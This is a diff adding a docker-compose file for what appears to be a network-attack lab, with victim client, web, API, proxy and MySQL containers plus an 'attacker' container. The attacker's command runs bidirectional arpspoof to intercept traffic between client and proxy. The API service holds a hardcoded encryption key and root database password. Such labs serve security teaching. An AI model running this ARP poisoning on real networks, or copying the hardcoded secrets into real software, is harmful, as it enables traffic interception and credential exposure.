@@ -1,0 +1,106 @@
+version: "3.9"
+
+services:
+  client-victim:
+    build:
+      context: ./client
+      dockerfile: Dockerfile
+    container_name: client-victim
+    hostname: client-victim
+    environment:
+      - PUID=1000
+      - PGID=1000
+      - TZ=Asia/Jakarta
+    ports:
+      - "3000:3000"
+    shm_size: "1gb"
+    networks:
+      secure-net:
+        ipv4_address: 10.10.10.40
+
+  frontend:
+    build:
+      context: ./frontend
+      dockerfile: Dockerfile
+    container_name: frontend-web
+    hostname: frontend-web
+    networks:
+      secure-net:
+        ipv4_address: 10.10.10.30
+    expose:
+      - "80"
+
+  backend:
+    build:
+      context: ./backend
+      dockerfile: Dockerfile
+    container_name: backend-api
+    hostname: backend-api
+    networks:
+      secure-net:
+        ipv4_address: 10.10.10.20
+    expose:
+      - "5000"
+    environment:
+      - APP_ENCRYPTION_KEY=11223344556677889900aabbccddeeff
+      - DB_HOST=10.10.10.60
+      - DB_USER=root
+      - DB_PASSWORD=rahasia
+      - DB_NAME=karyawan_db
+    depends_on:
+      - mysql-db
+
+  nginx-proxy:
+    build:
+      context: ./nginx
+      dockerfile: Dockerfile
+    container_name: nginx-proxy
+    hostname: nginx-proxy
+    ports:
+      - "443:443"
+      - "80:80"
+    networks:
+      secure-net:
+        ipv4_address: 10.10.10.10
+    depends_on:
+      - backend
+
+  mysql-db:
+    image: mysql:8.0
+    container_name: mysql-db
+    hostname: mysql-db
+    environment:
+      MYSQL_ROOT_PASSWORD: rahasia
+      MYSQL_DATABASE: karyawan_db
+    networks:
+      secure-net:
+        ipv4_address: 10.10.10.60
+
+  attacker:
+    build:
+      context: ./attacker
+      dockerfile: Dockerfile
+    container_name: attacker
+    hostname: attacker
+    cap_add:
+      - NET_ADMIN
+      - NET_RAW
+    sysctls:
+      - net.ipv4.ip_forward=1
+    networks:
+      secure-net:
+        ipv4_address: 10.10.10.50
+    # Menjalankan ARP Spoofing dua arah (Poisoning) secara otomatis di background
+    # agar traffic antara Client (.40) dan Proxy (.10) berbelok melewati Attacker (.50)
+    command: >
+      sh -c "arpspoof -i eth0 -t 10.10.10.10 10.10.10.40 & arpspoof -i eth0 -t 10.10.10.40 10.10.10.10 & sleep infinity"
+    depends_on:
+      - nginx-proxy
+      - client-victim
+
+networks:
+  secure-net:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 10.10.10.0/24
